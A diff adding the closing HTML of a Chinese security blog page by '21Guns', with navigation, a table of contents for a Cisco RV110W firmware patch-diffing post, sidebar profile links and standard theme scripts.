+      <i class="fa fa-chevron-left"></i> 耶鲁智能门锁的安全分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/20/iot/BLE设备的安全分析/" rel="next" title="BLE设备的安全分析">
+      BLE设备的安全分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#补丁对比法对Cisco-RV110W进行固件分析"><span class="nav-number">1.</span> <span class="nav-text">补丁对比法对Cisco RV110W进行固件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#上"><span class="nav-number">1.1.</span> <span class="nav-text">上</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#01-diff目录"><span class="nav-number">1.1.1.</span> <span class="nav-text">01-diff目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#02-utelnetd"><span class="nav-number">1.1.2.</span> <span class="nav-text">02-utelnetd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#03-获取hash"><span class="nav-number">1.1.3.</span> <span class="nav-text">03-获取hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#04-总结"><span class="nav-number">1.1.4.</span> <span class="nav-text">04-总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#下"><span class="nav-number">1.2.</span> <span class="nav-text">下</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#version-track"><span class="nav-number">1.2.1.</span> <span class="nav-text">version_track</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#准备"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#流程"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#结果"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bindiff"><span class="nav-number">1.2.2.</span> <span class="nav-text">bindiff</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#准备-1"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#结果-1"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">结果</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其它"><span class="nav-number">1.2.3.</span> <span class="nav-text">其它</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">21Guns</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">164</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">21Guns</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
